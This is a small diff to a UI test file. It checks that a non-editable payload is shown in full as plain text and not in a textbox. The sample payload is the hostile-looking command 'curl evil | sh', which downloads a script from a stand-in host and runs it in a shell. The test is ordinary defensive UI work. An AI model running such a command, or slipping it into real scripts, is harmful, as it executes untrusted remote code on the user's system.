@@ -89,8 +89,9 @@ test("a non-editable payload is displayed in full", () => {
     />,
   );
 
-  expect(screen.getByDisplayValue("curl evil | sh")).toBeDefined();
-  expect(screen.getByDisplayValue("looks harmless")).toBeDefined();
+  expect(screen.getByText("curl evil | sh")).toBeDefined();
+  expect(screen.getByText("looks harmless")).toBeDefined();
+  expect(screen.queryByRole("textbox")).toBeNull();
 });
 
 test("uses the block's input schema and never shows the credential id", async () => {
